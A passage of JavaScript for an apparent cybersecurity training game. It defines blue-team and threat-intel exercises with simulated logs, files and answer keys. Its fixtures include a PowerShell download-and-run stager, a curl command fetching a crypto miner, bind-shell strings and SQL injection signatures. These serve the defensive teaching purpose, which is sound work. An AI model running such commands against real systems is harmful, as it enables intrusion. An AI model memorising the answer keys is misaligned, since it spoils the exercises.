    {t:'File the finding', h:'report set finding Password reuse … · report set severity High · report set evidence /var/backups/app.conf.bak · report set fix Rotate and use unique passwords · report submit', ok:c=>c.st.submitted},
  ],
  on(c,ev,v){ if(ev==='read'&&/app\.conf\.bak/.test(v)) c.st.rootpw=true; if(ev==='read'&&/proof\.txt/.test(v)) c.seen.proof=1; if(ev==='submit'&&v) c.st.submitted=true; },
  debrief:'<p>You found three escalation paths and used the quietest one. Use the least invasive method that proves impact, and never change the client’s systems more than you need to.</p><ul><li>A good finding has: <b>title, severity, affected asset, evidence, impact, remediation</b>. Severity usually follows CVSS or the client’s own scale.</li><li>Report all three paths (SUID find, writable root cron script, password reuse). The client needs to fix all of them, not just the one you used.</li></ul>' },

{ id:'b1', track:'blue', title:'Log Analysis 101',
  sum:'Reconstruct an SSH brute-force attack from auth.log with grep, awk, sort and uniq, and find what the attacker did next.',
  skills:['grep','awk','sort | uniq -c','timelines','T1110'],
  lesson:`<p>Logs are the defender’s camera footage. Tier-1 analysts spend most of the day asking questions of them.</p>
<h4>THE CORE PIPELINE</h4><p><code>grep "Failed password" auth.log | awk '{print $11}' | sort | uniq -c | sort -nr</code></p>
<ul><li><b>grep</b> keeps the lines you care about · <b>awk</b> pulls one column (here the IP) · <b>sort | uniq -c</b> counts them · <b>sort -nr</b> puts the biggest first.</li>
<li>A pile of failures followed by a <b>success from the same IP</b> means a brute force that worked. That’s an incident.</li><li>Then follow the account: what did it do after logging in?</li></ul>`,
  brief:'Alert: "Excessive SSH authentication failures" on <b>web-prod-01</b>. You have a copy of <b>/var/log/auth.log</b>. Work out what happened.',
  cmds:[...BASIC], chips:['wc -l /var/log/auth.log','grep "Failed password" /var/log/auth.log | head','grep Accepted /var/log/auth.log','grep sudo /var/log/auth.log','answer '],
  make(){ const h=H('analyst','soc-ws','/home/analyst',{'/var/log/auth.log':authLog(),'/home/analyst/ticket.txt':'TICKET SOC-4471\nAlert: excessive SSH failures on web-prod-01\nTask: confirm or close. If confirmed: attacker IP, compromised account, time of compromise, attacker actions.'});
    return {hosts:{me:h},h,net:{},st:{}}; },
  obj:[
    {t:'Which IP is responsible for most failed logins?', ans:['203.0.113.9'], h:'grep "Failed password" /var/log/auth.log | awk \'{print $11}\' | sort | uniq -c | sort -nr'},
    {t:'How many failed logins came from that IP?', ans:['28'], h:'grep "Failed password" /var/log/auth.log | grep 203.0.113.9 | wc -l'},
    {t:'Which account did the attacker get into?', ans:['svc-backup'], h:'grep Accepted /var/log/auth.log, and look for the attacker’s IP.'},
    {t:'At what time did the compromise happen? (HH:MM:SS)', ans:['03:14:22'], h:'The timestamp on the Accepted password line from the attacker IP.'},
    {t:'What backdoor account did they create? (name)', ans:['sysmaint'], h:'grep sudo /var/log/auth.log, then read the useradd command. -o -u 0 means a second root account.'},
  ],
  debrief:'<p>You turned an alert into a confirmed incident with a timeline. That’s the core tier-1 job.</p><ul><li>The escalation note to tier 2 would read: brute force from 203.0.113.9 (T1110) → valid login as svc-backup at 03:14:22 (T1078) → uid-0 account "sysmaint" created (T1136).</li><li>Next steps: disable svc-backup and sysmaint, block the IP, check for other logins from it, and ask why a service account accepted passwords over SSH.</li><li>In a SIEM this is one query. Learning the pipeline teaches you what that query does.</li></ul>' },

{ id:'b2', track:'blue', title:'Incident Response: Lock It Down',
  sum:'A server is mining crypto for someone else. Find the backdoor, preserve evidence, remove persistence, contain and harden.',
  skills:['ps aux','ss -tulpn','cron persistence','evidence first','ufw'],
  lesson:`<p>Incident response follows an order: <b>identify → preserve evidence → contain → eradicate → recover</b>. Do it out of order and you lose evidence or the attacker comes straight back.</p>
<h4>KEY IDEAS</h4><ul><li>Unknown listeners (<code>ss -tulpn</code>) and odd processes (<code>ps aux</code>) are your leads.</li><li><b>Hash before you delete.</b> The hash is your IOC for hunting elsewhere.</li>
<li>Kill the <b>persistence</b> (cron, services) before the process, or it respawns.</li><li>Finish by shrinking the attack surface: default-deny firewall.</li></ul>`,
  brief:'You are on-call for <b>web-prod-01</b>. CPU is pinned at 100% and there is odd outbound traffic. You have root. Find it, contain it, and harden the box.',
  cmds:[...BASIC,'ps','ss','netstat','kill','rm','crontab','chmod','ufw','sha256sum','strings'], chips:['ss -tulpn','ps aux','ls /etc/cron.d','find / -perm -o+w -type f','ufw status'],
  make(){ const bad='ELF..kworker\n/tmp/.x/kworker\npool.minexmr.example:4444\nstratum+tcp://\n--donate-level=0\nbind 0.0.0.0:4444 /bin/sh';
    const h=H('root','web-prod-01','/root',{
      '/root/NOTES.txt':'on-call notes: nginx on 80, sshd on 22. Nothing else should be listening.',
      '/etc/passwd':{c:'root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\ndeploy:x:1001:1001::/home/deploy:/bin/bash',m:'0666'},
      '/etc/crontab':'SHELL=/bin/sh\n17 *  * * *  root  cd / && run-parts --report /etc/cron.hourly',
      '/etc/cron.d/sys-update':'# looks legit, isn\'t\n* * * * * www-data /tmp/.x/kworker >/dev/null 2>&1',
      '/tmp/.x/kworker':{c:bad,m:'0755',o:'www-data',strings:bad},
      '/var/log/auth.log':'Nov 14 02:01:44 web-prod-01 sshd[902]: Accepted password for deploy from 198.51.100.23 port 51990\nNov 14 02:03:10 web-prod-01 sudo: deploy : COMMAND=/usr/bin/curl -o /tmp/.x/kworker http://198.51.100.23/k',
    });
    return { hosts:{me:h}, h, net:{}, st:{
      procs:[{u:'root',pid:1,cpu:0.0,c:'/sbin/init'},{u:'root',pid:811,cpu:0.0,c:'/usr/sbin/sshd -D'},{u:'www-data',pid:930,cpu:0.3,c:'nginx: worker process'},
             {u:'www-data',pid:1337,cpu:98.7,c:'/tmp/.x/kworker -B --bind 0.0.0.0:4444',bad:1},{u:'root',pid:1402,cpu:0.0,c:'-bash'}],
      listen:[{port:22,p:'sshd (811)',pid:811},{port:80,p:'nginx (930)',pid:930},{port:4444,p:'kworker (1337)',pid:1337,bad:1}],
      fw:{on:false,def:'allow',rules:[]}, cronLive:true }}; },
  obj:[
    {t:'Find the rogue listener', h:'ss -tulpn. Only 22 and 80 should be open.', ok:c=>c.seen.ss},
    {t:'Identify the malicious process', h:'ps aux: high CPU, running out of /tmp.', ok:c=>c.seen.ps},
    {t:'Fingerprint the malware before you touch it', h:'sha256sum /tmp/.x/kworker (strings on it is revealing too).', ok:c=>c.seen.hash},
    {t:'Remove the persistence', h:'Something restarts it. ls /etc/cron.d, cat the odd file, rm it.', ok:c=>!c.h.fs['/etc/cron.d/sys-update']},
    {t:'Kill the process and delete the dropper', h:'kill 1337, then rm -rf /tmp/.x', ok:c=>!c.st.procs.some(p=>p.bad)&&!c.h.fs['/tmp/.x/kworker']},
    {t:'Fix the dangerous file permission', h:'find / -perm -o+w -type f, then chmod 644 the system file it finds.', ok:c=>(c.h.fs['/etc/passwd'].m||'').slice(-1)==='4'},
    {t:'Turn on a default-deny firewall', h:'ufw default deny incoming · ufw allow 22 · ufw allow 80 · ufw enable', ok:c=>{const f=c.st.fw; return f.on&&f.def==='deny'&&f.rules.some(r=>r.p===22&&r.a==='allow');}},
  ],
  on(c,ev,v){ if(ev==='rm'&&v==='/etc/cron.d/sys-update') c.st.cronLive=false;
    if(ev==='kill'&&c.st.cronLive&&c.h.fs['/tmp/.x/kworker']) setTimeout(()=>{ if(T.c!==c) return; if(!c.st.procs.some(p=>p.bad)&&c.st.cronLive&&c.h.fs['/tmp/.x/kworker']){
      c.st.procs.push({u:'www-data',pid:1512,cpu:97.9,c:'/tmp/.x/kworker -B --bind 0.0.0.0:4444',bad:1}); c.st.listen.push({port:4444,p:'kworker (1512)',pid:1512,bad:1});
      T.say('<span class="info">[cron] a new kworker process appeared (pid 1512). Remove the persistence first.</span>',1); } },3000); },
  debrief:'<p>Read <b>/var/log/auth.log</b> on this box. It shows how they got in: a password login as deploy, then sudo curl to download the miner. You removed the symptom, but the root cause is still open.</p><ul><li>Full recovery means rotating deploy’s password, reviewing its sudo rights, and ideally rebuilding the server from a known-good image.</li><li>Hand-off note: IOC hash, C2 pool.minexmr.example:4444, source IP 198.51.100.23, ATT&CK T1078, T1053.003, T1496.</li></ul>' },

{ id:'b3', track:'blue', title:'Hardening Baseline',
  sum:'Audit a new server before it goes live: rogue root accounts, risky SSH settings, a blanket sudo rule and a legacy service.',
  skills:['/etc/passwd','sshd_config','sed -i','sudoers.d','systemctl'],
  lesson:`<p>Most breaches exploit <b>configuration</b>, not zero-days. Hardening means making the default state safe. CIS Benchmarks are the industry checklist.</p>
<h4>THE BASELINE</h4><ul><li>Only root has uid 0. Check with <code>awk -F: '$3==0' /etc/passwd</code>.</li><li>SSH: <code>PermitRootLogin no</code> and <code>PasswordAuthentication no</code> (keys only), then restart sshd.</li>
<li>No blanket <code>NOPASSWD: ALL</code> sudo rules.</li><li>No cleartext legacy services (telnet, ftp). <code>systemctl disable --now</code> them.</li></ul>`,
  brief:'<b>app-prod-03</b> was built from an old image and goes live tomorrow. You have root. Bring it up to the security baseline.',
  cmds:[...BASIC,'sed','userdel','systemctl','rm','ss','chmod'], chips:["awk -F: '$3==0' /etc/passwd","grep -E 'PermitRoot|PasswordAuth' /etc/ssh/sshd_config",'ls /etc/sudoers.d','ss -tulpn','systemctl status telnet'],
  make(){ const h=H('root','app-prod-03','/root',{
      '/etc/passwd':'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\ntoor:x:0:0::/root:/bin/bash\nappsvc:x:1002:1002::/opt/app:/usr/sbin/nologin\nintern:x:1003:1003::/home/intern:/bin/bash',
      '/etc/ssh/sshd_config':'# sshd_config\nPort 22\nPermitRootLogin yes\nPasswordAuthentication yes\nX11Forwarding yes\nMaxAuthTries 6\nUsePAM yes',
      '/etc/sudoers.d/10-appsvc':'appsvc ALL=(root) NOPASSWD: /usr/bin/systemctl restart app',
      '/etc/sudoers.d/90-temp':'# temporary, remove after migration (2024)\nintern ALL=(ALL) NOPASSWD: ALL',
      '/root/baseline.txt':'BASELINE v3\n[ ] only root has uid 0\n[ ] PermitRootLogin no\n[ ] PasswordAuthentication no (keys only), restart sshd after\n[ ] no NOPASSWD: ALL rules\n[ ] no telnet / ftp',
    }); return {hosts:{me:h},h,net:{},st:{
      listen:[{port:22,p:'sshd (640)',svc:'ssh'},{port:23,p:'in.telnetd (702)',svc:'telnet',bad:1},{port:443,p:'app (911)',svc:'app'}],
      svcs:{ssh:{on:true,en:true},telnet:{on:true,en:true},app:{on:true,en:true}}, procs:[], fw:{on:false,def:'allow',rules:[]} }}; },
  obj:[
    {t:'Which account besides root has uid 0?', ans:['toor'], h:"awk -F: '$3==0' /etc/passwd (or grep ':0:0:' /etc/passwd)"},
    {t:'Remove the rogue uid-0 account', h:'userdel toor', ok:c=>!/^toor:/m.test(c.h.fs['/etc/passwd'].c)},
    {t:'Disable root login over SSH', h:"sed -i 's/PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config", ok:c=>/^PermitRootLogin no$/m.test(c.h.fs['/etc/ssh/sshd_config'].c)},
    {t:'Disable SSH password logins (keys only)', h:"sed -i 's/PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config", ok:c=>/^PasswordAuthentication no$/m.test(c.h.fs['/etc/ssh/sshd_config'].c)},
    {t:'Apply the SSH changes', h:'Config files are read at start-up: systemctl restart ssh', ok:c=>c.st.sshApplied},
    {t:'Remove the blanket sudo rule', h:'ls /etc/sudoers.d, cat each, rm the NOPASSWD: ALL one.', ok:c=>!c.h.fs['/etc/sudoers.d/90-temp']},
    {t:'Shut down the cleartext legacy service for good', h:'ss -tulpn shows port 23. systemctl disable --now telnet', ok:c=>!c.st.svcs.telnet.on&&!c.st.svcs.telnet.en},
  ],
  on(c,ev,v){ if(ev==='restart'&&v==='ssh'){ const s=c.h.fs['/etc/ssh/sshd_config'].c; if(/^PermitRootLogin no$/m.test(s)&&/^PasswordAuthentication no$/m.test(s)) c.st.sshApplied=true; else T.say('<span class="dim">ssh restarted, but the baseline settings aren’t both in place yet.</span>',1); } },
  debrief:'<p>Every item you fixed shows up in real breach reports: hidden uid-0 accounts, root SSH with passwords, "temporary" sudo rules from years ago, and telnet.</p><ul><li>In production you’d automate this (Ansible, cloud-init, golden images) and verify it continuously (Lynis, OpenSCAP, CIS-CAT).</li><li>Always keep a second session open while changing SSH settings, so a typo can’t lock you out.</li></ul>' },

{ id:'b4', track:'blue', title:'Web Attack Triage',
  sum:'Spot SQL injection probes and a successful path-traversal attack in nginx logs, judge what leaked, contain and escalate.',
  skills:['access.log','attack signatures','status codes','ufw deny from','impact'],
  lesson:`<p>Web servers get probed constantly. The analyst’s job is separating <b>noise</b> from <b>impact</b>.</p>
<h4>READING AN ACCESS LOG LINE</h4><p><code>IP - - [time] "GET /path HTTP/1.1" STATUS SIZE "referer" "user-agent"</code></p>
<ul><li><b>Signatures:</b> <code>' OR '1'='1</code>, <code>UNION SELECT</code> and <code>SLEEP(</code> are SQL injection probes; <code>../../</code> is path traversal.</li><li><b>Status codes</b> tell you the outcome: 500/403/404 usually means it failed; <b>200 with a real size</b> means the server answered.</li>
<li>The user-agent often names the tool, though attackers can fake it.</li></ul>`,
  brief:'The WAF vendor flagged "possible SQLi" on <b>shop-web-01</b>. Triage <b>/var/log/nginx/access.log</b>: what happened, did anything succeed, and what must happen now?',
  cmds:[...BASIC,'ufw'], chips:["awk '{print $1}' /var/log/nginx/access.log | sort | uniq -c | sort -nr",'grep 192.0.2.66 /var/log/nginx/access.log','grep "../" /var/log/nginx/access.log','ufw status','answer '],
  make(){ const h=H('root','shop-web-01','/root',{'/var/log/nginx/access.log':accessLog(),'/var/www/app/.env':{c:'DB_PASSWORD=Plaza-Copper-23\nSTRIPE_SECRET_KEY=sk_live_REDACTED_EXAMPLE\nSESSION_SECRET=9c1f-REDACTED',m:'0640',o:'www-data'}});
    return {hosts:{me:h},h,net:{},st:{fw:{on:true,def:'deny',rules:[{p:80,a:'allow'},{p:443,a:'allow'},{p:22,a:'allow'}]}}}; },
  obj:[
    {t:'Which IP is attacking the site?', ans:['192.0.2.66'], h:"awk '{print $1}' /var/log/nginx/access.log | sort | uniq -c | sort -nr, then grep that IP."},
    {t:'What tool does the SQL injection traffic’s user-agent name?', ans:['sqlmap'], h:'grep 192.0.2.66 the log and read the last quoted field.'},
    {t:'Did the SQL injection succeed? (yes/no)', ans:['no'], h:'Look at the status codes on the id= requests. 500 means the app crashed on the input, not that data came back.'},
    {t:'Which attack type DID succeed?', ans:['traversal','directory traversal','path traversal'], h:'Find attacker requests that got 200 with a real response size.'},
    {t:'Which secrets file was stolen? (filename)', ans:['.env'], h:'The second successful download request.'},
    {t:'Contain: block the attacker at the firewall', h:'ufw deny from 192.0.2.66', ok:c=>c.st.fw.rules.some(r=>r.ip==='192.0.2.66')},
    {t:'What must be rotated immediately? (one example)', ans:['db_password','database password','stripe','api key','session','secret','password','key'], h:'cat /var/www/app/.env: everything in it is now in the attacker’s hands.'},
  ],
  debrief:'<p>The headline isn’t "SQL injection attempt". It’s <b>"secrets exfiltrated via path traversal"</b>. The noisy attack failed; the quiet one worked. Always check what succeeded.</p><ul><li>Blocking an IP is short-term containment. Attackers change IPs in minutes.</li><li>The real fixes: rotate every secret in .env, patch the download handler to reject paths outside its folder, and check payment-provider logs for use of the stolen key.</li><li>This incident probably triggers legal and compliance notification. Escalate early.</li></ul>' },

{ id:'i1', track:'intel', title:'Indicators & Tradecraft',
  sum:'Decode an obfuscated command, extract and defang IOCs, apply the Pyramid of Pain, and handle TLP correctly.',
  skills:['base64 -d','IOC types','defanging','Pyramid of Pain','TLP'],
  lesson:`<p>Indicators of compromise (IOCs) are the raw material of threat intel: hashes, IPs, domains, URLs. Handle them carefully.</p>
<h4>KEY IDEAS</h4><ul><li><b>Defang</b> before sharing so nobody clicks by accident: <code>http://evil.example</code> → <code>hxxp://evil[.]example</code>.</li>
<li><b>Pyramid of Pain</b> (David Bianco): hashes and IPs are trivial for attackers to change; domains are a bit harder; tools harder still; <b>TTPs</b> (behaviour) are the hardest. Detections built on behaviour last longest.</li>
<li><b>TLP</b> (Traffic Light Protocol) says how far you may share: CLEAR (public) · GREEN (community) · AMBER (your organisation and its clients, need-to-know) · RED (named recipients only).</li></ul>`,
  brief:'Case <b>IR-1001</b>: a helpdesk PC ran an encoded PowerShell command. Decode it, pull out the indicators, and prepare them for sharing.',
  cmds:[...BASIC,'base64','ti'], chips:['ls /cases/IR-1001','cat /cases/IR-1001/README','base64 -d /cases/IR-1001/encoded.txt','cat /intel/pyramid.txt','answer '],
  make(){ const dec="$u='http://198.51.100.14/stage2.ps1'; Invoke-WebRequest $u -OutFile $env:TEMP\\svc.ps1; Start-Process powershell -ArgumentList \"-File $env:TEMP\\svc.ps1\" -WindowStyle Hidden";
    const h=H('analyst','ti-workstation','/home/analyst',{
      '/cases/IR-1001/README':'Helpdesk PC HD-07 ran: powershell.exe -nop -w hidden -enc <payload>\nThe payload is in encoded.txt. Partner ISAC report template: partner_share.txt (TLP:AMBER)',
      '/cases/IR-1001/encoded.txt':btoa(dec),
      '/cases/IR-1001/partner_share.txt':'TLP:AMBER\nRecipients: members of the regional finance ISAC\nDo not post publicly.',
      '/intel/pyramid.txt':'PYRAMID OF PAIN (top = most painful for the attacker to change)\n  TTPs\n  Tools\n  Network/Host Artifacts\n  Domain Names\n  IP Addresses\n  Hash Values',
    }); return {hosts:{me:h},h,net:{},st:{}}; },
  ti:{whois:{},dns:{},ioc:{'198.51.100.14':'IP 198.51.100.14 · VPS · seen hosting PowerShell stagers in 4 incidents · first seen 2026-10-02'},pivot:{},actors:[]},
  obj:[
    {t:'Decode the payload', h:'base64 -d /cases/IR-1001/encoded.txt', ok:c=>c.seen.base64},
    {t:'What IP does it download the next stage from?', ans:['198.51.100.14'], h:'Read the URL in the decoded command.'},
    {t:'Write that URL defanged', ans:['hxxp://198.51.100[.]14/stage2.ps1','hxxp://198[.]51[.]100[.]14/stage2.ps1'], h:'http → hxxp and the last dot of the host → [.]: hxxp://198.51.100[.]14/stage2.ps1'},
    {t:'Which is harder for an attacker to change: the IP or the technique "download and run a hidden PowerShell stager"?', ans:['technique','ttp','ttps','behaviour','behavior'], h:'cat /intel/pyramid.txt'},
    {t:'The report is TLP:AMBER. May you post it on a public blog? (yes/no)', ans:['no'], h:'AMBER = limited disclosure, need-to-know within organisations. CLEAR is the public level.'},
  ],
  debrief:'<p>Everything in a real CTI workflow builds on these habits: decode before judging, defang before sharing, respect TLP, and look past atomic IOCs to behaviour.</p><ul><li>The IP will be dead in a week. "Office or helpdesk process spawns hidden PowerShell that downloads to %TEMP%" is a detection that keeps working.</li><li>Defanging conventions vary slightly by team. Be consistent and say what you used.</li></ul>' },

{ id:'i2', track:'intel', title:'Phishing Analysis',
  sum:'Dissect a credential-phishing email: authentication results, lookalike domains, infrastructure age and the phishing kit behind it.',
  skills:['email headers','SPF/DKIM/DMARC','lookalike domains','whois age','T1566.002'],
  lesson:`<p>Phishing is the most common way in. Analysts triage hundreds of reported emails, so you need a fast, repeatable method.</p>
<h4>THE METHOD</h4><ul><li><b>Authentication-Results:</b> SPF (was the sending server allowed?), DKIM (is the signature valid?), DMARC (does it all line up with the From domain?). Fails are a strong signal.</li>
<li><b>From vs Reply-To vs Return-Path</b>: mismatches are a classic tell.</li><li><b>Lookalike domains</b>: micros0ft, rn instead of m, extra words like -support or -secure.</li><li><b>Domain age</b> via whois: days-old domains are almost never legitimate senders.</li></ul>`,
  brief:'Three staff reported the same "password expiry" email. Analyse <b>/cases/PH-0412/</b>, decide whether it’s malicious, and say what the business must do.',
  cmds:[...BASIC,'whois','dig','ti','attack','report'], chips:['cat /cases/PH-0412/email.eml','grep -i authentication /cases/PH-0412/email.eml','whois micros0ft-support.example','ti lookup login.micros0ft-support.example','report'],
  make(){ const h=H('analyst','ti-workstation','/home/analyst',{
      '/cases/PH-0412/email.eml':'Return-Path: <bounce@mailer-77.example>\nReceived: from mailer-77.example (198.51.100.201)\nAuthentication-Results: mx.contoso.example;\n   spf=fail (contoso.example: 198.51.100.201 is not permitted) smtp.mailfrom=micros0ft-support.example;\n   dkim=none;\n   dmarc=fail header.from=micros0ft-support.example\nFrom: "Microsoft 365" <no-reply@micros0ft-support.example>\nReply-To: it-desk.helper@freemail.example\nTo: j.alvarez@contoso.example\nSubject: [Action Required] Your password expires in 2 hours\n\nYour Microsoft 365 password expires today.\nKeep your current password: https://login.micros0ft-support.example/owa/keep?u=j.alvarez\n',
      '/cases/PH-0412/clicks.csv':'user,clicked,submitted_credentials\nj.alvarez,yes,no\nm.chen,yes,yes\nr.osei,no,no',
    }); return {hosts:{me:h},h,net:{},st:{}}; },
  ti:{whois:{'micros0ft-support.example':'Domain Name: MICROS0FT-SUPPORT.EXAMPLE\nCreation Date: 2026-11-12  (2 days ago)\nRegistrar: QuickReg LLC\nRegistrant: Privacy service',
             'mailer-77.example':'Creation Date: 2026-11-11\nRegistrar: QuickReg LLC'},
      dns:{'login.micros0ft-support.example':'203.0.113.120','micros0ft-support.example':'203.0.113.120'},
      ioc:{'login.micros0ft-support.example':'<span class="err">PHISHING</span> · credential-harvest page cloning the Microsoft 365 login\nKit: <b>TideCatch</b> (fictional adversary-in-the-middle kit; relays the login to Microsoft live, so it can steal the session cookie and get past MFA)\nSeen against 31 orgs this month',
           '203.0.113.120':'IP 203.0.113.120 · hosts 14 lookalike login domains · TideCatch panel'},
      pivot:{'203.0.113.120':'Other domains on 203.0.113.120:\n  rnicrosoft-login.example\n  office365-verify.example\n  sharepoint-docs-secure.example'},actors:[]},
  truth:{verdict:['malicious','phish'],technique:['t1566.002'],action:['reset','revoke'],block:['micros0ft-support','203.0.113.120']},
  reportHint:'verdict malicious · technique T1566.002 · action: reset password and revoke sessions for the user who submitted · block the domain or IP.',
  obj:[
    {t:'What was the SPF result?', ans:['fail'], h:'grep -i authentication /cases/PH-0412/email.eml'},
    {t:'What lookalike domain sent it?', ans:['micros0ft-support.example'], h:'The From header. Look closely at the "o".'},
    {t:'How old was the sending domain when the email arrived? (days)', ans:['2','2 days'], h:'whois micros0ft-support.example'},
    {t:'What kit is behind the login page?', ans:['tidecatch'], h:'ti lookup login.micros0ft-support.example'},
    {t:'Which user submitted credentials?', ans:['m.chen'], h:'cat /cases/PH-0412/clicks.csv'},
    {t:'File the report', h:'report set verdict malicious · technique T1566.002 · action … · block … · report submit', ok:c=>c.st.submitted},
  ],
  on(c,ev,v){ if(ev==='submit'&&v) c.st.submitted=true; },
  debrief:'<p>The key judgment: this kit relays the login live, so <b>MFA alone does not save m.chen</b>. You must reset the password <i>and</i> revoke their active sessions and tokens.</p><ul><li>Pivoting on the hosting IP found more lookalike domains. Block them all before the next wave.</li><li>A good phishing report states the verdict, the evidence, who is affected, and what was done. Then add a detection for the lookalike pattern.</li></ul>' },

{ id:'i3', track:'intel', title:'Attribution: Operation Scarlet Mirage',
  sum:'Triage a malware alert end to end: hash, strings, family, infrastructure pivots, ATT&CK mapping and a defensible attribution.',
  skills:['sha256sum','strings','ti pivot','ATT&CK mapping','attribution'],
  lesson:`<p>Attribution means stacking independent evidence until one explanation clearly beats the others, and stating your <b>confidence</b> honestly.</p>
<h4>EVIDENCE TYPES</h4><ul><li><b>Malware:</b> family, unique strings, debug (PDB) paths, mutexes.</li><li><b>Infrastructure:</b> shared hosting, name servers, registrars, registration timing.</li><li><b>Behaviour (TTPs):</b> how they get in, persist and talk home, mapped to ATT&CK.</li></ul>
<p>One overlap proves little. Several independent overlaps support "likely".</p>`,
  brief:'An EDR alert fired on <b>FIN-LT-042</b>. Case files are in <b>/cases/IR-2291</b>. Work out the malware, its infrastructure, its behaviour and the likely actor, then file a report. <span class="dim">Actors and infrastructure are fictional.</span>',
  cmds:[...BASIC,'sha256sum','strings','whois','dig','ti','attack','report'], chips:['ls /cases/IR-2291','cat /cases/IR-2291/alert.json','sha256sum /cases/IR-2291/syncsvc.exe','ti actors','report'],
  make(){ const Hh='9f2c4be17a03d5e8c61b0f4a2e97d3c58a1f06b7e24c9d013a5e8f7b62c4d1e9';
    const strs='!This program cannot be run in DOS mode.\nGloomLdr v2.3\nMutex: Global\\SM-7731-SYNC\nC:\\dev\\mirage\\gloom\\Release\\gloom.pdb\nhttps://cdn-sync.updatecheck.example/api/v2/beacon\nschtasks /create /tn "OneDrive Sync" /sc minute /mo 30\npowershell -nop -w hidden -enc';
    const h=H('analyst','ti-workstation','/home/analyst',{
      '/cases/IR-2291/alert.json':'{\n  "alert": "Suspicious PowerShell spawned by WINWORD.EXE",\n  "host": "FIN-LT-042",\n  "parent": "WINWORD.EXE  (Invoice_Q4_overdue.docm)",\n  "dropped": "C:\\\\Users\\\\m.ortiz\\\\AppData\\\\Roaming\\\\syncsvc.exe",\n  "sha256": "'+Hh+'",\n  "network": "203.0.113.47:443"\n}',
      '/cases/IR-2291/syncsvc.exe':{c:'MZ..binary..',strings:strs,hash:Hh,ftype:'PE32+ executable (GUI) x86-64, for MS Windows'},
      '/cases/IR-2291/proxy.log':'2026-11-13T09:12:01 FIN-LT-042 GET https://cdn-sync.updatecheck.example/api/v2/beacon 200\n2026-11-13T09:42:01 FIN-LT-042 GET https://cdn-sync.updatecheck.example/api/v2/beacon 200\n2026-11-13T10:14:55 FIN-LT-042 POST https://cdn-sync.updatecheck.example/api/v2/upload 200',
    }); return {hosts:{me:h},h,net:{},st:{}}; },
  ti:{ whois:{'203.0.113.47':'OrgName: Lumen Hosting Ltd (ASN 64511)\nComment: offshore VPS provider, frequent abuse reports','updatecheck.example':'Creation Date: 2026-10-29 (16 days before the alert)\nName Server: ns1.lumenhost.example'},
    dns:{'cdn-sync.updatecheck.example':'203.0.113.47','updatecheck.example':'203.0.113.47'},
    ioc:{'9f2c4be17a03d5e8c61b0f4a2e97d3c58a1f06b7e24c9d013a5e8f7b62c4d1e9':'<span class="err">MALICIOUS</span> 48/71 engines\nFamily: <b>GloomLdr</b> (loader, v2.x)\nTags: macro-delivered, scheduled-task, https-c2\nLinked to: <b>Scarlet Mirage</b> (medium confidence, 6 prior cases)',
         '203.0.113.47':'ASN 64511 · seen as C2 for GloomLdr in 3 cases since September'},
    pivot:{},
    actors:[{n:'Scarlet Mirage',aka:'APT-SM · fictional',d:'Espionage + theft against finance teams. Invoice-themed macro documents, custom loader "GloomLdr", scheduled tasks named after sync tools, C2 on ASN 64511.'},
            {n:'Copper Vulture',aka:'FIN-CV · fictional',d:'Ransomware affiliate. Gets in via exposed VPN and RDP, steals data to cloud storage, then encrypts.'},
            {n:'Static Lotus',aka:'APT-SL · fictional',d:'Targets telecoms through edge-device exploits. Rarely uses email.'}] },
  truth:{family:['gloom'],actor:['scarlet','apt-sm'],c2:['203.0.113.47','updatecheck'],technique:['t1566','t1059','t1053','t1071'],confidence:['moderate','medium']},
  reportHint:'family GloomLdr · actor Scarlet Mirage · c2 the IP or domain · technique e.g. T1566.001 · confidence moderate (several overlaps, no definitive link).',
  obj:[
    {t:'Triage the alert', h:'cat /cases/IR-2291/alert.json', ok:c=>c.seen.readAlert},
    {t:'Fingerprint the sample', h:'sha256sum /cases/IR-2291/syncsvc.exe. Does it match the alert?', ok:c=>c.seen.hash},
    {t:'Extract IOCs from the binary', h:'strings /cases/IR-2291/syncsvc.exe', ok:c=>c.seen.strings},
    {t:'Identify the malware family', h:'ti lookup <the sha256>', ok:c=>c.seen.famFound},
    {t:'Map the C2 infrastructure', h:'dig the beacon domain, whois the IP, ti pivot the domain.', ok:c=>c.seen.dig&&c.seen.whois&&c.seen.pivot},
    {t:'Map behaviour to ATT&CK (look up at least 2 techniques)', h:'Macro document, PowerShell, schtasks and the HTTPS beacon each map to a technique. attack list', ok:c=>(c.seen.attackN||0)>=2},
    {t:'Attribute and file the report, with a confidence level', h:'ti actors to compare. report set family/actor/c2/technique/confidence, then report submit', ok:c=>c.st.submitted},
  ],
  on(c,ev,v){ if(ev==='read'&&/alert\.json/.test(v)) c.seen.readAlert=1; if(ev==='lookup'&&/GloomLdr/.test(c.sc.ti.ioc[v]||'')) c.seen.famFound=1;
    if(ev==='attack') c.seen.attackN=(c.seen.attackN||0)+1; if(ev==='submit'&&v) c.st.submitted=true; },
  debrief:'<p>Count your independent overlaps: malware family, PDB path naming ("mirage"), shared hosting ASN, a name server shared with known Scarlet Mirage domains, and matching TTPs. That supports "likely Scarlet Mirage, <b>moderate confidence</b>". Not high: malware and hosting can be shared or bought.</p><ul><li>Attribution is useful to defenders when it predicts what comes next. Know the actor and you know to hunt for scheduled tasks named after sync tools elsewhere in the network.</li></ul>' },

{ id:'i4', track:'intel', title:'Intel for Decision-Makers',
  sum:'Track a ransomware group across leak-site data and vendor reports, answer a priority intelligence requirement, and write an assessment with calibrated language.',
  skills:['PIRs','leak-site tracking','grep | uniq -c','estimative language','recommendations'],
  lesson:`<p>Intelligence only matters if it changes a decision. Leaders ask questions, called <b>Priority Intelligence Requirements (PIRs)</b>. You answer them in plain language.</p>
<h4>ESTIMATIVE LANGUAGE</h4><p>Use calibrated words, not vague ones (based on ICD 203):</p>
<ul><li><b>unlikely</b> ≈ 20–45% · <b>roughly even chance</b> ≈ 45–55% · <b>likely</b> ≈ 55–80% · <b>very likely</b> ≈ 80–95%</li><li>Separate <b>likelihood</b> (how probable) from <b>confidence</b> (how good your evidence is).</li><li>Always end with what the reader should <b>do</b>.</li></ul>`,
  brief:'The CISO of <b>Mercy Valley Health</b> (US hospital group) asks the question in <b>/intel/PIR.txt</b>. Use the leak-site tracker and vendor reports to answer it.',
